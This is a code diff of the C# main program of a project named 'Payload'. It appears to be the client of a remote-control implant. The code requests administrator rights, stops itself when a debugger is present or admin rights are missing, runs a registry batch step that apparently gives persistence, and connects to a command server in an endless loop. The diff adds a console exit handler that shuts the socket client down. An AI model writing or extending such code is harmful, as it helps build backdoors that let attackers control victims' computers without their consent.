@@ -1,14 +1,18 @@
 ﻿
+using System.Reflection.Metadata;
+using System.Runtime.InteropServices;
 using CommonClassLibrary;
+using Microsoft.VisualBasic;
 using Payload.Command;
 using Payload.Core.Command;
+using static CommonClassLibrary.Common.AppExitEvent;
 
 new KillOtherMeFactory().CreateCommand().Execute();
 new CallAdminFactory().CreateCommand().Execute();
 
 if (Config.IsDebug() || !Config.Instance.IsUserAdministrator())
 {
-    Console.WriteLine("Safe Lock");
+    Console.WriteLine(Config.IsDebug()?"Safe Lock":"Non-Admin");
     return;
 }
 
@@ -24,6 +28,13 @@ if (!Config.Instance.CheckWorkingTarget())
 new RegistryKeyBatFactory().CreateCommand().Execute();
 
 var payloadSocketClient = new Payload.SocketIoClient(Config.SocketIOClientCommandServerHost);
+
+// Register the Exit Event handler
+DefaultConsoleCtrlHandler(
+    () => {
+        payloadSocketClient.StopClient();
+    });
+
 
 while (true)
 {
